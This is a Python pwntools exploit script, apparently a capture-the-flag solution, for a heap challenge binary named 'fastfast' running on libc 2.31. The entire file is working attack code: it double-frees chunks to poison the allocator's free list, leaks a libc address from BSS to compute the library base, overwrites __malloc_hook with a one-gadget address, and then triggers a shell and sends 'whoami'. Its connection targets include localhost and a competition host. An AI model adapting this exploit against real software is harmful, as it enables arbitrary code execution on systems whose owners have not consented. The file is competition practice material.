from pwn import *

io = remote("127.0.0.1", 13325)
# io = remote("192.168.170.128", 1234)
# io = remote("competition.blue-whale.me", 20631)
# io = process("./fastfast")
# io = remote("3.1.2.3", 8888)
# context(os="linux", arch="amd64")
context(os="linux", arch="amd64", log_level="debug")
elf = ELF('./fastfast')
libc = ELF('./libc-2.31.so')

s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda text, data: io.sendafter(text, data)
sla = lambda text, data: io.sendlineafter(text, data)
r = lambda: io.recv()
ru = lambda text: io.recvuntil(text)
uu32 = lambda: u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda: u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda: int(io.recv(10), 16)
iuu64 = lambda: int(io.recv(6), 16)
uheap = lambda: u64(io.recv(6).ljust(8, b'\x00'))
lg = lambda addr: log.info(addr)
ia = lambda: io.interactive()

# gdb.attach(io)
# gdb.attach(io, 'b printf')
# gdb.attach(io, 'b *0x0400B03')

def choice(choice):
    ru(b'>>> ')
    sl(str(choice))


def create(idx, content):
    choice(1)
    ru(b'idx')
    sl(str(idx))
    ru(b'content')
    sl(content)


def delete(idx):
    choice(2)
    ru(b'idx')
    sl(str(idx))


def show(idx):
    choice(3)
    ru(b'idx')
    sl(str(idx))


bss = 0x404070

for i in range(9):
    create(i, b'666')
for i in range(9):
    delete(i)

delete(7)

for i in range(7):
    create(i, b'666777')
create(7, p64(bss))
create(8, b'dddd')
create(9, b'a')
create(10, p64(bss))
show(10)
stdout = uu64()
lg(hex(stdout))

libc_base = stdout - libc.sym['_IO_2_1_stdout_'] # 2021024
system = libc_base + libc.sym['system']
malloc_hook = libc_base + libc.sym['__malloc_hook'] - 0x23
onegg = [0xe3b2e, 0xe3b31, 0xe3b34]

for i in range(9):
    create(i, b'666')
for i in range(9):
    delete(i)

delete(7)

for i in range(7):
    create(i, b'666777')
create(7, p64(malloc_hook))
create(8, p64(malloc_hook))
create(9, b'a')
create(10, b'a' * 0x23 + p64(libc_base + onegg[1]))
# create(11, p64(system))
# gdb.attach(io)
ru(b'>> ')
sl(b'1')
sl(b'1')
sl(b'whoami')

ia()
